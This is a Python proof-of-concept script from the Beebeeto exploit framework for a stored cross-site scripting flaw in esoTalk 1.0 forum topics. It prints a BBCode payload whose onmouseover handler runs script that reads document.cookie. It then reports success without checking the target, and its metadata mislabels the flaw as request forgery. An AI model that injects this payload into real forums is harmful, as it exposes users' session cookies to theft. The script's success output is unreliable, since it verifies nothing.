#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0137',
            'name': 'Esotalk topic xss vulnerability POC',
            'author': 'evi1m0',
            'create_date': '2014-11-05',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'esotalk',
            'vul_version': ['1.0'],
            'type': 'Cross Site Request Forgery',
            'tag': ['esotalk漏洞', 'xss', 'topic xss vul', 'php'],
            'desc': 'esotalk topic xss vul.',
            'references': ['http://www.hackersoul.com/post/ff0000-hsdb-0006.html',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        temp = '''
        [url=[img]onmouseover=alert(document.cookie);//://example.com/image.jpg#"aaaaaa[/img]]evi1m0[/url]
        '''
        print '[*] Copy code: ' + temp
        print '[*] Specific use: ' + str(MyPoc.poc_info['vul']['references'])
        args['success'] = True
        args['poc_ret']['vul_url'] = 'Generation ok'
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())